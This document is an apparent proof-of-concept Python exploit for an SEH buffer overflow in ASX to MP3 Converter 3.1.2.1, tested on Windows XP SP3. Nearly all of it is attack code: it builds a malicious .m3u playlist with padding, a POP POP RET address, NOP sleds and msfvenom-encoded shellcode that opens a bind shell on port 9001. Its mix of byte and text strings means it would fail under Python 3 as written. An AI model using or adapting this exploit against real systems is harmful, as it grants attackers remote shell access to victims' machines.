# Exploit for ASX to MP3 Converter 3.1.2.1 - SEH
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
file = open("exploit.m3u", "wb")

# POP POP RET in MSA2Mfilter03.dll = 0x10031659
# msfvenom -p windows/shell_bind_tcp LPORT=9001 -a x86 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a" -f python -v shellcode_bind

shellcode_bind =  b""
shellcode_bind += b"\xb8\x93\x8d\x61\xa3\xda\xcd\xd9\x74\x24"
shellcode_bind += b"\xf4\x5b\x2b\xc9\xb1\x53\x31\x43\x12\x83"
shellcode_bind += b"\xeb\xfc\x03\xd0\x83\x83\x56\x2a\x73\xc1"
shellcode_bind += b"\x99\xd2\x84\xa6\x10\x37\xb5\xe6\x47\x3c"
shellcode_bind += b"\xe6\xd6\x0c\x10\x0b\x9c\x41\x80\x98\xd0"
shellcode_bind += b"\x4d\xa7\x29\x5e\xa8\x86\xaa\xf3\x88\x89"
shellcode_bind += b"\x28\x0e\xdd\x69\x10\xc1\x10\x68\x55\x3c"
shellcode_bind += b"\xd8\x38\x0e\x4a\x4f\xac\x3b\x06\x4c\x47"
shellcode_bind += b"\x77\x86\xd4\xb4\xc0\xa9\xf5\x6b\x5a\xf0"
shellcode_bind += b"\xd5\x8a\x8f\x88\x5f\x94\xcc\xb5\x16\x2f"
shellcode_bind += b"\x26\x41\xa9\xf9\x76\xaa\x06\xc4\xb6\x59"
shellcode_bind += b"\x56\x01\x70\x82\x2d\x7b\x82\x3f\x36\xb8"
shellcode_bind += b"\xf8\x9b\xb3\x5a\x5a\x6f\x63\x86\x5a\xbc"
shellcode_bind += b"\xf2\x4d\x50\x09\x70\x09\x75\x8c\x55\x22"
shellcode_bind += b"\x81\x05\x58\xe4\x03\x5d\x7f\x20\x4f\x05"
shellcode_bind += b"\x1e\x71\x35\xe8\x1f\x61\x96\x55\xba\xea"
shellcode_bind += b"\x3b\x81\xb7\xb1\x53\x66\xfa\x49\xa4\xe0"
shellcode_bind += b"\x8d\x3a\x96\xaf\x25\xd4\x9a\x38\xe0\x23"
shellcode_bind += b"\xdc\x12\x54\xbb\x23\x9d\xa5\x92\xe7\xc9"
shellcode_bind += b"\xf5\x8c\xce\x71\x9e\x4c\xee\xa7\x0b\x44"
shellcode_bind += b"\x49\x18\x2e\xa9\x29\xc8\xee\x01\xc2\x02"
shellcode_bind += b"\xe1\x7e\xf2\x2c\x2b\x17\x9b\xd0\xd4\x34"
shellcode_bind += b"\x75\x5c\x32\x50\x95\x08\xec\xcc\x57\x6f"
shellcode_bind += b"\x25\x6b\xa7\x45\x1d\x1b\xe0\x8f\x9a\x24"
shellcode_bind += b"\xf1\x85\x8c\xb2\x7a\xca\x08\xa3\x7c\xc7"
shellcode_bind += b"\x38\xb4\xeb\x9d\xa8\xf7\x8a\xa2\xe0\x6f"
shellcode_bind += b"\x2e\x30\x6f\x6f\x39\x29\x38\x38\x6e\x9f"
shellcode_bind += b"\x31\xac\x82\x86\xeb\xd2\x5e\x5e\xd3\x56"
shellcode_bind += b"\x85\xa3\xda\x57\x48\x9f\xf8\x47\x94\x20"
shellcode_bind += b"\x45\x33\x48\x77\x13\xed\x2e\x21\xd5\x47"
shellcode_bind += b"\xf9\x9e\xbf\x0f\x7c\xed\x7f\x49\x81\x38"
shellcode_bind += b"\xf6\xb5\x30\x95\x4f\xca\xfd\x71\x58\xb3"
shellcode_bind += b"\xe3\xe1\xa7\x6e\xa0\x02\x4a\xba\xdd\xaa"
shellcode_bind += b"\xd3\x2f\x5c\xb7\xe3\x9a\xa3\xce\x67\x2e"
shellcode_bind += b"\x5c\x35\x77\x5b\x59\x71\x3f\xb0\x13\xea"
shellcode_bind += b"\xaa\xb6\x80\x0b\xff"

nops = 36 * "\x90"

buffer = "A" * 43480 + "\xeb\x14\x90\x90\x59\x16\x03\x10" + nops + shellcode_bind + nops + "C" * (50000 - 8 - 43480 - len(shellcode_bind) - len(2*nops))

file.write(buffer)
file.close()
